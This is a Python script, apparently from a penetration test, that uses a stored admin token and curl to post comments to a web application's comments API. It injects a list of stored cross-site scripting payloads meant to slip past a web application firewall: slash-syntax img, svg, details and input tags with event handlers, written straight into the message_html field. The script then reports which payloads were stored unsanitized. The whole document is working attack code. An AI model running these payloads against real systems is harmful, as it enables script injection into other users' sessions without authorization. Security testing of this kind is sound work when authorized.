import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
tag='ZXN'+uuid.uuid4().hex[:5]
def post(html,raw=None):
    body={"comment":{"type":"Comment","commentable_type":"ExceptionRequest",
                     "commentable_id":33,
                     "message_raw":raw if raw is not None else html,
                     "message_html":html}}
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',H+'/api/v1/comments',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== message_html direct, slash-syntax (WAF-passing) payloads ===")
probes=[
 ('img-slash',   f'<img/src=x/onerror=alert(document.domain)>{tag}'),
 ('img-slash2',  f'<img/src=x/onerror=alert(1) >{tag}'),
 ('img-nospace', f'<img/src=x/onerror=alert(1)/>{tag}'),
 ('svg-slash',   f'<svg/onload=alert(1)>{tag}'),
 ('details-sl',  f'<details/open/ontoggle=alert(1)>{tag}'),
 ('input-sl',    f'<input/autofocus/onfocus=alert(1)>{tag}'),
]
for label,h in probes:
    c,b=post(h)
    st=''
    if c in ('200','201'):
        try:
            o=json.loads(b)['comments'][0]
            st=f"id={o['id']} html={o.get('message_html')!r}"
        except: pass
    print(f"  {label:14} {c:>4}  {st[:110]}")
